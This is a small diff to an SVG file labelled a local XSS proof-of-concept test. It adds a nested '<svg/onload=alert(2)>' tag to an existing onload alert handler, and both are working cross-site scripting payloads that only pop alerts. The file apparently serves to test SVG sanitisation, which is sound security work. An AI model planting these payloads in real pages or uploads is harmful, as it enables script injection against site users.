@@ -1,3 +1,4 @@
 <svg xmlns="http://www.w3.org/2000/svg" onload="alert('SVG script executed (safe test)');">
   <text x="10" y="20">Local XSS PoC Test</text>
+  <svg/onload=alert(2)>
 </svg>
